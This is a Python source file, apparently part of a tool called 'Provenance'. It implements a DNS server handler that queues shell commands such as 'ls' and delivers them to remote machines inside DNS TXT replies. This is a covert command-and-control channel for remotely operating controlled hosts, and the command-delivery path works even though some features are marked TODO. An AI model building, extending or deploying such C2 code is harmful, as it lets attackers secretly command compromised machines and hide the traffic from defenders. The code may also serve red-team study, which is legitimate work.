import dnslib
from socketserver import UDPServer, BaseRequestHandler
import threading

class IndividualClientHandler(BaseRequestHandler):
    """ This represents a machine being controlled by Provenance"""


    """ Builtin Functions"""
    def __init__(self, request, client_address, server, name=None):
        # Superclass initialization
        self.server = server
        self.request = request
        self.client_address = client_address

        # Subclass Initialization
        self.name = name
        self.ip = client_address[0]
        self.active = False
        self.record_type = "TXT"
        self.last_request_id = None
        self.queued_commands = ["<1>:ls"]
        self.sent_commands = []
    
    def __repr__(self):
        return f"{self.name}{{{self.ip}, {self.record_type}}}"

    """ Subclass Functions"""
    def handle(self):
        data = self.get_data()
        request = dnslib.DNSRecord.parse(data)
        # Check IDs for repeat numbers, ignore if processed
        if not self.last_request_id == request.header.id:
            print(request)
            self.last_request_id = request.header.id
            self.send_cmd(request)


    def get_data(self):
        return self.request[0].strip()


    """ Provenance Specific Functions"""
    def queue_cmd(self, cmd):
        self.queued_commands.append(cmd)

    def send_cmd(self, request):
        if not self.queued_commands:
            # TODO: send Nop
            return

        # TODO: use dictionary switch to encode different packets
        cmd = self.queued_commands.pop()
        # Generate skeleton question for packet
        command_packet = request.reply() 
        # Generate the response to the question
        command_packet.add_answer(
            dnslib.RR(
                rname="fakedomain.com",
				rtype=dnslib.QTYPE.TXT,
                rclass=dnslib.CLASS.IN,
				rdata=dnslib.TXT(cmd),
                ttl=1337))
        # send command
        socket = self.request[1]
        print(f"[INFO] Sending command to {self.client_address}")
        print(f"{command_packet.pack()}")
        socket.sendto(command_packet.pack(), self.client_address)
        self.sent_commands.append((request.header.id,cmd))

